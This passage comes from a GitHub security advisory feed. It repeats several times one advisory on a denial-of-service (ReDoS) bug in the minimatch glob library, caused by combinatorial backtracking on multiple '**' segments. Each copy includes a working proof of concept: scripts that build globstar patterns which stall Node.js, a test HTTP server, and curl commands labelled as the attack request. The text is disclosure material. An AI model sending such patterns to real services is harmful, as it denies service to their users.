<p>Any application where an attacker can influence the glob pattern passed to <code>minimatch()</code> is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj">https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27903">https://nvd.nist.gov/vuln/detail/CVE-2026-27903</a></li>
<li><a href="https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748">https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748</a></li>
<li><a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj">https://github.com/advisories/GHSA-7r86-cg39-jmmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r86-cg39-jmmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:10:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[minimatch] minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments]]></title>
        <id>https://github.com/advisories/GHSA-7r86-cg39-jmmj</id>
        <link href="https://github.com/advisories/GHSA-7r86-cg39-jmmj"/>
        <updated>2026-02-26T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>matchOne()</code> performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent <code>**</code> (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where <code>n</code> is the number of path segments and <code>k</code> is the number of globstars. With k=11 and n=30, a call to the default <code>minimatch()</code> API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.</p>
<hr>
<h3 id="details">Details</h3>
<p>The vulnerable loop is in <code>matchOne()</code> at <a href="https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960"><code>src/index.ts#L960</code></a>:</p>
<pre><code class="language-typescript">while (fr &lt; fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
</code></pre>
<p>When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each <code>**</code> multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).</p>
<p>There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning <code>false</code> on a non-matching input.</p>
<p>Measured timing with n=30 path segments:</p>
<table>
<thead>
<tr>
<th>k (globstars)</th>
<th>Pattern size</th>
<th>Time</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>36 bytes</td>
<td>~154ms</td>
</tr>
<tr>
<td>9</td>
<td>46 bytes</td>
<td>~1.2s</td>
</tr>
<tr>
<td>11</td>
<td>56 bytes</td>
<td>~5.4s</td>
</tr>
<tr>
<td>12</td>
<td>61 bytes</td>
<td>~9.7s</td>
</tr>
<tr>
<td>13</td>
<td>66 bytes</td>
<td>~15.9s</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p>Tested on <a href="mailto:minimatch@10.2.2">minimatch@10.2.2</a>, Node.js 20.</p>
<p><strong>Step 1 -- inline script</strong></p>
<pre><code class="language-javascript">import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
</code></pre>
<p>To scale the effect, increase k:</p>
<pre><code class="language-javascript">// k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () =&gt; '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
</code></pre>
<p>No special options are required. This reproduces with the default <code>minimatch()</code> call.</p>
<p><strong>Step 2 -- HTTP server (event loop starvation proof)</strong></p>
<p>The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:</p>
<pre><code class="language-javascript">// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) =&gt; {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
</code></pre>
<p>Terminal 1 -- start the server:</p>
<pre><code>node poc1-server.mjs
</code></pre>
<p>Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:</p>
<pre><code>curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &amp;
</code></pre>
<p>Terminal 3 -- while the attack is in-flight, send a benign request:</p>
<pre><code>curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz"
</code></pre>
<p><strong>Observed output (Terminal 3):</strong></p>
<pre><code>{"result":true,"ms":"0"}

time_total: 4.132709s
</code></pre>
<p>The server reports <code>"ms":"0"</code> -- the legitimate request itself takes zero processing time. The 4+ second <code>time_total</code> is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:</p>
<pre><code>{"result":true,"ms":"0"}

time_total: 0.001599s
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p>Any application where an attacker can influence the glob pattern passed to <code>minimatch()</code> is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj">https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27903">https://nvd.nist.gov/vuln/detail/CVE-2026-27903</a></li>
<li><a href="https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748">https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748</a></li>
<li><a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj">https://github.com/advisories/GHSA-7r86-cg39-jmmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r86-cg39-jmmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:10:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[minimatch] minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments]]></title>
        <id>https://github.com/advisories/GHSA-7r86-cg39-jmmj</id>
        <link href="https://github.com/advisories/GHSA-7r86-cg39-jmmj"/>
        <updated>2026-02-26T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>matchOne()</code> performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent <code>**</code> (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where <code>n</code> is the number of path segments and <code>k</code> is the number of globstars. With k=11 and n=30, a call to the default <code>minimatch()</code> API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.</p>
<hr>
<h3 id="details">Details</h3>
<p>The vulnerable loop is in <code>matchOne()</code> at <a href="https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960"><code>src/index.ts#L960</code></a>:</p>
<pre><code class="language-typescript">while (fr &lt; fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
</code></pre>
<p>When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each <code>**</code> multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).</p>
<p>There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning <code>false</code> on a non-matching input.</p>
<p>Measured timing with n=30 path segments:</p>
<table>
<thead>
<tr>
<th>k (globstars)</th>
<th>Pattern size</th>
<th>Time</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>36 bytes</td>
<td>~154ms</td>
</tr>
<tr>
<td>9</td>
<td>46 bytes</td>
<td>~1.2s</td>
</tr>
<tr>
<td>11</td>
<td>56 bytes</td>
<td>~5.4s</td>
</tr>
<tr>
<td>12</td>
<td>61 bytes</td>
<td>~9.7s</td>
</tr>
<tr>
<td>13</td>
<td>66 bytes</td>
<td>~15.9s</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p>Tested on <a href="mailto:minimatch@10.2.2">minimatch@10.2.2</a>, Node.js 20.</p>
<p><strong>Step 1 -- inline script</strong></p>
<pre><code class="language-javascript">import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
</code></pre>
<p>To scale the effect, increase k:</p>
<pre><code class="language-javascript">// k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () =&gt; '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
</code></pre>
<p>No special options are required. This reproduces with the default <code>minimatch()</code> call.</p>
<p><strong>Step 2 -- HTTP server (event loop starvation proof)</strong></p>
<p>The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:</p>
<pre><code class="language-javascript">// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) =&gt; {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
</code></pre>
<p>Terminal 1 -- start the server:</p>
<pre><code>node poc1-server.mjs
</code></pre>
<p>Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:</p>
<pre><code>curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &amp;
</code></pre>
<p>Terminal 3 -- while the attack is in-flight, send a benign request:</p>
<pre><code>curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz"
</code></pre>
<p><strong>Observed output (Terminal 3):</strong></p>
<pre><code>{"result":true,"ms":"0"}

time_total: 4.132709s
</code></pre>
<p>The server reports <code>"ms":"0"</code> -- the legitimate request itself takes zero processing time. The 4+ second <code>time_total</code> is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:</p>
<pre><code>{"result":true,"ms":"0"}

time_total: 0.001599s
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p>Any application where an attacker can influence the glob pattern passed to <code>minimatch()</code> is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj">https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27903">https://nvd.nist.gov/vuln/detail/CVE-2026-27903</a></li>
<li><a href="https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748">https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748</a></li>
<li><a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj">https://github.com/advisories/GHSA-7r86-cg39-jmmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r86-cg39-jmmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:10:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[minimatch] minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments]]></title>
        <id>https://github.com/advisories/GHSA-7r86-cg39-jmmj</id>
        <link href="https://github.com/advisories/GHSA-7r86-cg39-jmmj"/>
        <updated>2026-02-26T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>matchOne()</code> performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent <code>**</code> (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where <code>n</code> is the number of path segments and <code>k</code> is the number of globstars. With k=11 and n=30, a call to the default <code>minimatch()</code> API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.</p>
<hr>
<h3 id="details">Details</h3>
<p>The vulnerable loop is in <code>matchOne()</code> at <a href="https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960"><code>src/index.ts#L960</code></a>:</p>
<pre><code class="language-typescript">while (fr &lt; fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
</code></pre>
<p>When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each <code>**</code> multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).</p>
<p>There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning <code>false</code> on a non-matching input.</p>
<p>Measured timing with n=30 path segments:</p>
<table>
<thead>
<tr>
<th>k (globstars)</th>
<th>Pattern size</th>
<th>Time</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>36 bytes</td>
<td>~154ms</td>
</tr>
<tr>
<td>9</td>
<td>46 bytes</td>
<td>~1.2s</td>
</tr>
<tr>
<td>11</td>
<td>56 bytes</td>
<td>~5.4s</td>
</tr>
<tr>
<td>12</td>
<td>61 bytes</td>
<td>~9.7s</td>
</tr>
<tr>
<td>13</td>
<td>66 bytes</td>
<td>~15.9s</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p>Tested on <a href="mailto:minimatch@10.2.2">minimatch@10.2.2</a>, Node.js 20.</p>
<p><strong>Step 1 -- inline script</strong></p>
<pre><code class="language-javascript">import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
</code></pre>
<p>To scale the effect, increase k:</p>
<pre><code class="language-javascript">// k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () =&gt; '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
</code></pre>
<p>No special options are required. This reproduces with the default <code>minimatch()</code> call.</p>
<p><strong>Step 2 -- HTTP server (event loop starvation proof)</strong></p>
<p>The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:</p>
<pre><code class="language-javascript">// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) =&gt; {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
</code></pre>
<p>Terminal 1 -- start the server:</p>
<pre><code>node poc1-server.mjs
</code></pre>
<p>Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:</p>
<pre><code>curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &amp;
</code></pre>
<p>Terminal 3 -- while the attack is in-flight, send a benign request:</p>
<pre><code>curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz"
</code></pre>
<p><strong>Observed output (Terminal 3):</strong></p>
<pre><code>{"result":true,"ms":"0"}

time_total: 4.132709s
</code></pre>
<p>The server reports <code>"ms":"0"</code> -- the legitimate request itself takes zero processing time. The 4+ second <code>time_total</code> is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:</p>
<pre><code>{"result":true,"ms":"0"}

time_total: 0.001599s
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p>Any application where an attacker can influence the glob pattern passed to <code>minimatch()</code> is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj">https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27903">https://nvd.nist.gov/vuln/detail/CVE-2026-27903</a></li>
<li><a href="https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748">https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748</a></li>
<li><a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj">https://github.com/advisories/GHSA-7r86-cg39-jmmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r86-cg39-jmmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:10:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[minimatch] minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments]]></title>
        <id>https://github.com/advisories/GHSA-7r86-cg39-jmmj</id>
        <link href="https://github.com/advisories/GHSA-7r86-cg39-jmmj"/>
        <updated>2026-02-26T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>matchOne()</code> performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent <code>**</code> (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where <code>n</code> is the number of path segments and <code>k</code> is the number of globstars. With k=11 and n=30, a call to the default <code>minimatch()</code> API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior.</p>
<hr>
<h3 id="details">Details</h3>
<p>The vulnerable loop is in <code>matchOne()</code> at <a href="https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960"><code>src/index.ts#L960</code></a>:</p>
<pre><code class="language-typescript">while (fr &lt; fl) {
  ..
  if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) {
    ..
    return true
  }
  ..
  fr++
}
</code></pre>
<p>When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each <code>**</code> multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k).</p>
<p>There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning <code>false</code> on a non-matching input.</p>
<p>Measured timing with n=30 path segments:</p>
<table>
<thead>
<tr>
<th>k (globstars)</th>
<th>Pattern size</th>
<th>Time</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>36 bytes</td>
<td>~154ms</td>
</tr>
<tr>
<td>9</td>
<td>46 bytes</td>
<td>~1.2s</td>
</tr>
<tr>
<td>11</td>
<td>56 bytes</td>
<td>~5.4s</td>
</tr>
<tr>
<td>12</td>
<td>61 bytes</td>
<td>~9.7s</td>
</tr>
<tr>
<td>13</td>
<td>66 bytes</td>
<td>~15.9s</td>
</tr>
</tbody></table>
<hr>
<h3 id="poc">PoC</h3>
<p>Tested on <a href="mailto:minimatch@10.2.2">minimatch@10.2.2</a>, Node.js 20.</p>
<p><strong>Step 1 -- inline script</strong></p>
<pre><code class="language-javascript">import { minimatch } from 'minimatch'

// k=9 globstars, n=30 path segments
// pattern: 46 bytes, default options
const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b'
const path    = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a'

const start = Date.now()
minimatch(path, pattern)
console.log(Date.now() - start + 'ms') // ~1200ms
</code></pre>
<p>To scale the effect, increase k:</p>
<pre><code class="language-javascript">// k=11 -&gt; ~5.4s, k=13 -&gt; ~15.9s
const k = 11
const pattern = Array.from({ length: k }, () =&gt; '**/a').join('/') + '/b'
const path    = Array(30).fill('a').join('/')
minimatch(path, pattern)
</code></pre>
<p>No special options are required. This reproduces with the default <code>minimatch()</code> call.</p>
<p><strong>Step 2 -- HTTP server (event loop starvation proof)</strong></p>
<p>The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common:</p>
<pre><code class="language-javascript">// poc1-server.mjs
import http from 'node:http'
import { URL } from 'node:url'
import { minimatch } from 'minimatch'

const PORT = 3000

const server = http.createServer((req, res) =&gt; {
  const url = new URL(req.url, `http://localhost:${PORT}`)
  if (url.pathname !== '/match') { res.writeHead(404); res.end(); return }

  const pattern = url.searchParams.get('pattern') ?? ''
  const path    = url.searchParams.get('path') ?? ''

  const start  = process.hrtime.bigint()
  const result = minimatch(path, pattern)
  const ms     = Number(process.hrtime.bigint() - start) / 1e6

  res.writeHead(200, { 'Content-Type': 'application/json' })
  res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n')
})

server.listen(PORT)
</code></pre>
<p>Terminal 1 -- start the server:</p>
<pre><code>node poc1-server.mjs
</code></pre>
<p>Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell:</p>
<pre><code>curl "http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&amp;path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa" &amp;
</code></pre>
<p>Terminal 3 -- while the attack is in-flight, send a benign request:</p>
<pre><code>curl -w "\ntime_total: %{time_total}s\n" "http://localhost:3000/match?pattern=**%2Fy%2Fz&amp;path=x%2Fy%2Fz"
</code></pre>
<p><strong>Observed output (Terminal 3):</strong></p>
<pre><code>{"result":true,"ms":"0"}

time_total: 4.132709s
</code></pre>
<p>The server reports <code>"ms":"0"</code> -- the legitimate request itself takes zero processing time. The 4+ second <code>time_total</code> is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline:</p>
<pre><code>{"result":true,"ms":"0"}

time_total: 0.001599s
</code></pre>
<hr>
<h3 id="impact">Impact</h3>
<p>Any application where an attacker can influence the glob pattern passed to <code>minimatch()</code> is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj">https://github.com/isaacs/minimatch/security/advisories/GHSA-7r86-cg39-jmmj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-27903">https://nvd.nist.gov/vuln/detail/CVE-2026-27903</a></li>
<li><a href="https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748">https://github.com/isaacs/minimatch/commit/0bf499aa45f5059b56809cc3b75ff3eafeb8d748</a></li>
<li><a href="https://github.com/advisories/GHSA-7r86-cg39-jmmj">https://github.com/advisories/GHSA-7r86-cg39-jmmj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r86-cg39-jmmj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-26T22:10:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[minimatch] minimatch has ReDoS: matchOne() combinatorial backtracking via multiple non-adjacent GLOBSTAR segments]]></title>
        <id>https://github.com/advisories/GHSA-7r86-cg39-jmmj</id>
        <link href="https://github.com/advisories/GHSA-7r86-cg39-jmmj"/>
        <updated>2026-02-26T22:10:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
